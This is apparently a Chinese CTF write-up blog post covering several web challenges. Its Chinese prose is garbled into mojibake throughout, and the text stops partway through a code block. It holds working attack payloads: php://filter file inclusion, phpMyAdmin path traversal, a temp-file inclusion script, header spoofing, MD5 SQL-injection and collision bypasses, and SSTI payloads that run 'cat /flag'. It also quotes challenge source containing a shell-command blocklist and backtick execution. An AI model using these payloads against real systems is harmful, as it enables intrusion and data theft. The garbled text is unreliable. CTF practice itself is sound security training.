<h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h4><p>æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°.&#x2F;Archive_room.phpï¼Œè®¿é—®ï¼Œæœ‰ä¸€ä¸ªsecretæŒ‰é’®ï¼ŒæŒ‰äº†è¦æŠ“åŒ…ï¼Œå‘ç°äº†secr3t.phpï¼Œè®¿é—®åå‘ç°phpä»£ç </p>
<p>ç›´æ¥ä½¿ç”¨ä¼ªåè®®</p>
<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p>æ‹¿åˆ°base64åŠ å¯†å¯†æ–‡ï¼Œè§£å¯†åå³å¯çœ‹åˆ°flag</p>
<hr>
<h4 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="*[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>*[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h4><p>phpmyadmin4.8.0-4.8.1å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p>?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p>
<hr>
<h4 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h4><p>ç‚¹å‡»woofersï¼Œå‘ç°urlæœ‰å‚æ•°ä¼ å…¥ï¼Œæ”¹ä¸ºï¼Œwoofers1ï¼ŒæŠ¥é”™ï¼Œå‘ç°åç¼€æœ‰ä¸€ä¸ª.phpï¼Œè€Œä¸”å¿…é¡»åŒ…å«woofersæˆ–è€…meowersï¼Œç”¨ä¼ªåè®®è¯»</p>
<p>?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;woofers&#x2F;..&#x2F;flag</p>
<hr>
<h4 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h4><p>burpæŠ“åŒ…ï¼Œå‘ç°cookieé‡Œæœ‰hashå€¼ï¼Œå°è¯•ä¼ å‚pass&#x3D;hashã€‚å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶<code>flflflflag.php</code> </p>
<p>ç”¨brupè®¿é—®flflflflag.phpï¼Œget ä¼ å‚file</p>
<p>&#x3D;&#x3D;ä¸´æ—¶æ–‡ä»¶åŒ…å«&#x3D;&#x3D;</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201136">https://www.anquanke.com/post/id/201136</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

payload <span class="token operator">=</span> <span class="token string">"&lt;?php phpinfo();?>"</span>
file_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span>
url<span class="token operator">=</span><span class="token string">"http://66b29ad5-fb7b-4ac2-b8c1-5f4abd6d8852.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=index.php"</span>
response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>file_data<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åè®¿é—®dir.phpï¼Œå¾—åˆ°ä¸´æ—¶æ–‡ä»¶åï¼Œå†åˆ°flflflflag.phpä¼ å‚file&#x3D;&#x2F;tmp&#x2F;phpFa081M</p>
<p>flagå°±åœ¨phpinfoé‡Œ</p>
<hr>
<h1 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h1><h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-Http"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h4><p>æŸ¥çœ‹æºä»£ç å‘ç°Secret.phpï¼Œè®¿é—®ã€‚</p>
<p>ä»–è¯´ä¸æ˜¯æ¥è‡ª <a href="https://Sycsecret.buuoj.cnç½‘ç«™çš„è®¿é—®ï¼Œæˆ‘ä»¬åœ¨bpä¸­çš„httpå¤´éƒ¨æ·»åŠ ï¼š">https://Sycsecret.buuoj.cnç½‘ç«™çš„è®¿é—®ï¼Œæˆ‘ä»¬åœ¨bpä¸­çš„httpå¤´éƒ¨æ·»åŠ ï¼š</a>	<code>Referer: https://Sycsecret.buuoj.cn</code></p>
<p>ç„¶ååˆè¯´æµè§ˆå™¨ä¸å¯¹ï¼Œæ”¹ï¼	User-Agent: Syclover</p>
<p>ç„¶ååˆè¯´åªèƒ½æœ¬åœ°æ‰èƒ½çœ‹ï¼Œè¿™é‡Œæœ‰æ¶‰åŠä¸€ä¸ªæ²¡æœ‰çš„å­—æ®µX-froward-forï¼Œä»£è¡¨ä»è®¿é—®è€…çš„åœ°å€ï¼ŒåŠ ä¸Šï¼Œå¹¶ä¸”æ”¹ä¸ºæœ¬åœ°å›ç¯åœ°å€127.0.0.1</p>
<p>X-forwarded-for: 127.0.0.1</p>
<p>X-Real-IPï¼š127.0.0.1</p>
<p>Client-ip:127.0.0.1</p>
<hr>
<h4 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h4><p>æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°flag.phpï¼Œç„¶åå®ƒè¯´éšè—ip,è¿™é‡ŒæŠ“åŒ…å¢åŠ <code>X-forwarded-for: 127.0.0.1</code></p>
<p>flagåœ¨æºä»£ç </p>
<hr>
<h1 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h1><h4 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h4><p>&#x3D;&#x3D;ffifdyop&#x3D;&#x3D;</p>
<p>ï¼ˆ1ï¼‰F12æŸ¥çœ‹ç½‘ç»œçŠ¶æ€ï¼Œå‘ç°å“åº”å¤´æœ‰Hint: select * from â€˜adminâ€™ where password&#x3D;md5($pass,true)</p>
<p>ï¼ˆ2ï¼‰æƒ³åŠæ³•ç»•è¿‡è¿™ä¸ªmd5(pass,true),å¦‚æœæˆ‘ä»¬æäº¤ä¸€ä¸ªå­—ç¬¦ä¸²ç»è¿‡md5ä¹‹åï¼Œç„¶ååˆç»è¿‡hexè½¬assciç æœ€ç»ˆæˆä¸ºâ€™or â€˜6XXXâ€™çš„è¯ï¼Œæˆ‘ä»¬å°±æ„é€ äº†ä¸€ä¸ªä¸‡èƒ½é’¥åŒ™ï¼Œå°±å¯ä»¥å¾—åˆ°å¦å¤–ä¸€ä¸ªé¡µé¢</p>
<p>è¿™ä¸ªå¯ä»¥ç”¨<code>ffifdyop</code>ç»•è¿‡ï¼Œç»•è¿‡åŸç†æ˜¯ï¼š<br><code>ffifdyop</code> è¿™ä¸ªå­—ç¬¦ä¸²è¢« md5 å“ˆå¸Œäº†ä¹‹åä¼šå˜æˆ <code>276f722736c95d99e921722cf9ed621c</code>ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å‰å‡ ä½åˆšå¥½æ˜¯ â€˜ <code>or &#39;6</code><br>è€Œ Mysql åˆšå¥½åˆä¼šæŠŠ hex è½¬æˆ ascii è§£é‡Šï¼Œå› æ­¤æ‹¼æ¥ä¹‹åçš„å½¢å¼æ˜¯ <code>select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6xxxxx&#39;</code>ï¼Œç­‰ä»·äº or ä¸€ä¸ªæ°¸çœŸå¼ï¼Œå› æ­¤ç›¸å½“äºä¸‡èƒ½å¯†ç ï¼Œå¯ä»¥ç»•è¿‡md5()å‡½æ•°</p>
<p>ï¼ˆ3ï¼‰ç„¶åè·³è½¬åˆ°æ–°çš„é¡µé¢</p>
<p>éœ€è¦ç»™a,bä¸¤ä¸ªå˜é‡ä¼ å‚å…¸å‹å¼±ç±»å‹åŒ¹é…md5ç¢°æ’ï¼ˆ0eå¼€å¤´ï¼‰ã€‚è€Œä¸”md5ä¸èƒ½å¤„ç†æ•°ç»„ï¼Œé‡åˆ°æ•°ç»„ä¸æŠ¥é”™ä½†æ˜¯ä¼šå°†å…¶è½¬å˜æˆNULL</p>
<p>?a[]&#x3D;1&amp;b[]&#x3D;2	æ•°ç»„ç»•è¿‡</p>
<p>ï¼ˆ4ï¼‰ä¸€æ ·æ•°ç»„ç»•è¿‡<code>param1[]=1&amp;param2[]=2</code>postä¼ å‚</p>
<hr>
<h4 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$gg</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$id</span> <span class="token operator">!==</span> <span class="token variable">$gg</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>åˆ©ç”¨æ•°ç»„ç»•è¿‡ï¼Œ?id[]&#x3D;1&amp;gg[]&#x3D;2</p>
<p>passwd&#x3D;&#x3D;1234567å¼±ç­‰äº</p>
<p>postä¼ å‚ï¼š</p>
<p>passwd&#x3D;1234567a</p>
<hr>
<h4 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h4><p>è¿™é¢˜é¢„æœŸè§£åº”è¯¥æ˜¯sortï¼Œä½†æ˜¯ca\tå´å¯ä»¥ç»•è¿‡ï¼Œæ˜¯å‡ºé¢˜äººå†™é”™æ­£åˆ™çš„åŸå› ã€‚</p>
<p>æ­£åˆ™åŒ¹é…åæ–œæ çš„é—®é¢˜ï¼š</p>
<p> <a target="_blank" rel="noopener" href="https://ego00.blog.csdn.net/article/details/109654384">å®‰æ´µæ¯ 2019]easy_web 1_fengçš„åšå®¢-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/076c5b422c96">ä»ä¸€é“CTFçš„éé¢„æœŸè§£çœ‹PHPåæ–œæ åŒ¹é…é—®é¢˜ - ç®€ä¹¦ (jianshu.com)</a></p>
<p>urlä¸­imgå‚æ•°çš„å€¼å¾ˆå¯ç–‘ï¼Œmd5è§£å¯†è¯•è¯•</p>
<p><code>TXpVek5UTTFNbVUzTURabE5qYz0-----base64è§£å¯†--&gt;MzUzNTM1MmU3MDZlNjc=-----base64è§£å¯†---&gt;3535352e706e67-----hexè§£å¯†-------&gt;555.png</code></p>
<p>è¯»å–index.phpæºç ï¼Œå¯¹<code>index.php</code>è¿›è¡ŒåŠ å¯†ï¼Œå¾—<code>TmpNM05EWTJNek15WlRaaE56QTJOVFkz</code></p>
<p>index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token class-name">E_ALL</span> <span class="token operator">||</span> <span class="token operator">~</span> <span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Refresh:0;url=./?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åŠ å¯†è¿‡ç¨‹</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-zA-Z0-9.]+/"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src ="./ctf3.jpeg">'</span><span class="token punctuation">;</span>
  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xixiï½ no flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> 
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
  <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='data:image/gif;base64,"</span> <span class="token operator">.</span> <span class="token variable">$txt</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'>&lt;/img>"</span><span class="token punctuation">;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|>/i"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span>
  <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"forbid ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//md5å¼ºæ¯”è¾ƒ</span>
    <span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`$cmd`</span><span class="token punctuation">;</span><span class="token comment">//å°†cmdçš„å€¼å½“åšç³»ç»ŸæŒ‡ä»¤æ‰§è¡Œ</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"md5 is funny ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä½¿ç”¨&#x3D;&#x3D;sortå‘½ä»¤&#x3D;&#x3D;è¯»ï¼šcmd&#x3D;sort%20&#x2F;flag</p>
<p>payload:</p>
<pre class="line-numbers language-none"><code class="language-none">?img&#x3D;TUdFMk9UWmxOalEyTlRjNE1tVTNNRFk0TnpBPQ&#x3D;&#x3D;&amp;cmd&#x3D;ca\t%20&#x2F;flag

a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><h4 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="*[RoarCTF 2019]Easy Java"></a>*[RoarCTF 2019]Easy Java</h4><p>æ¼æ´æˆå› ï¼šé€šå¸¸ä¸€äº›webåº”ç”¨æˆ‘ä»¬ä¼šä½¿ç”¨å¤šä¸ªwebæœåŠ¡å™¨æ­é…ä½¿ç”¨ï¼Œè§£å†³å…¶ä¸­çš„ä¸€ä¸ªwebæœåŠ¡å™¨çš„æ€§èƒ½ç¼ºé™·ä»¥åŠåšå‡è¡¡è´Ÿè½½çš„ä¼˜ç‚¹å’Œå®Œæˆä¸€äº›åˆ†å±‚ç»“æ„çš„å®‰å…¨ç­–ç•¥ç­‰ã€‚åœ¨ä½¿ç”¨è¿™ç§æ¶æ„çš„æ—¶å€™ï¼Œç”±äºå¯¹é™æ€èµ„æºçš„ç›®å½•æˆ–æ–‡ä»¶çš„æ˜ å°„é…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå¼•å‘ä¸€äº›çš„å®‰å…¨é—®é¢˜ï¼Œå¯¼è‡´web.xmlç­‰æ–‡ä»¶èƒ½å¤Ÿè¢«è¯»å–ã€‚</p>
<p>æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼š&#x3D;&#x3D;é€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç ã€‚&#x3D;&#x3D;ä¸€èˆ¬æƒ…å†µï¼Œjspå¼•æ“é»˜è®¤éƒ½æ˜¯ç¦æ­¢è®¿é—®WEB-INFç›®å½•çš„ï¼ŒNginx é…åˆTomcatåšå‡è¡¡è´Ÿè½½æˆ–é›†ç¾¤ç­‰æƒ…å†µæ—¶ï¼Œé—®é¢˜åŸå› å…¶å®å¾ˆç®€å•ï¼ŒNginxä¸ä¼šå»è€ƒè™‘é…ç½®å…¶ä»–ç±»å‹å¼•æ“ï¼ˆNginxä¸æ˜¯jspå¼•æ“ï¼‰å¯¼è‡´çš„å®‰å…¨é—®é¢˜è€Œå¼•å…¥åˆ°è‡ªèº«çš„å®‰å…¨è§„èŒƒä¸­æ¥ï¼ˆè¿™æ ·è€¦åˆæ€§å¤ªé«˜äº†ï¼‰ï¼Œä¿®æ”¹Nginxé…ç½®æ–‡ä»¶ç¦æ­¢è®¿é—®WEB-INFç›®å½•å°±å¥½äº†ï¼š location ~ ^&#x2F;WEB-INF&#x2F;* { deny all; } æˆ–è€…return 404; æˆ–è€…å…¶ä»–ï¼</p>
<p>(1)å…ˆæ‰¾ä¸€ä¸‹<code>WEB-INF/web.xml</code>,POSTä¼ å€¼<code>filename=WEB-INF/web.xml</code></p>
<p>(2)å¾—åˆ°WEB-INF&#x2F;web.xmlæ–‡ä»¶ï¼Œæ‰“å¼€çœ‹åˆ°<code>com.wm.FlagController</code>ï¼Œç„¶åä¸‹è½½FlagController.classæ–‡ä»¶</p>
<p>POSTä¼ å€¼<code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></p>
<p>è®°äº‹æœ¬æ‰“å¼€ï¼Œæœ‰ä¸€ä¸²base64ç¼–ç ï¼Œè§£ç ï¼Œå¾—åˆ°flag</p>
<hr>
<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h4 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h4><p>æŠ“åŒ…æ”¹ipï¼Œ</p>
<pre class="line-numbers language-none"><code class="language-none">X-forwarded-for:&#123;&#123;1*7&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å‘ç°é¡µé¢å˜ä¸ºäº†7ï¼Œç›´æ¥å‘é€ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">X-forwarded-for:&#123;&#123;system(&quot;cat &#x2F;flag&quot;)&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<hr>
<h4 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h4><p>æŠ“åŒ…ï¼Œåœ¨cookieå‘ç°æ³¨å…¥ç‚¹ï¼Œuser&#x3D;7ï¼Œæ˜¾ç¤ºhello 7ï¼Œå­˜åœ¨æ³¨å…¥</p>
<p>åŒºåˆ†Jinja2å’ŒTwig:</p>
<pre class="line-numbers language-none"><code class="language-none">Twig 
&#123;&#123;7*&#39;7&#39;&#125;&#125;  #è¾“å‡º49
Jinja
&#123;&#123;7*&#39;7&#39;&#125;&#125;  #è¾“å‡º7777777<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>æµ‹è¯•å‘ç°æ˜¯Twigæ¨¡æ¿</p>
<p>ç›´æ¥æœç½‘ä¸Šçš„Twigæ³¨å…¥æ¨¡æ¿</p>
<p><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</code></p>
<p>å¾—flag</p>
<hr>
<h4 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h4><p>æŠ“åŒ…çœ‹çœ‹ï¼Œå‘ç°é¡µé¢è¾“å‡ºäº†æˆ‘çš„ip,xffæ³¨å…¥ï¼Œå°è¯•X-forwarded-for: 7</p>
<p>å‘ç°é¡µé¢è¾“å‡º7ï¼Œå­˜åœ¨sstiæ³¨å…¥</p>
<pre class="line-numbers language-none"><code class="language-none">X-forwarded-for: &#123;&#123;system(&quot;cat &#x2F;flag&quot;)&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¾—åˆ°flag</p>
<hr>
<h4 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h4><p>æºç ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> flask
<span class="token keyword">import</span> os

app <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/shrine/&lt;path:shrine>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">shrine</span><span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span>
        <span class="token operator">//</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>åŒ…æ‹¬çš„å†…å®¹ä¸ºåç«¯å˜é‡ï¼Œ<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span> åŒ…æ‹¬çš„å†…å®¹ä¸ºé€»è¾‘è¯­å¥
        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> s
    
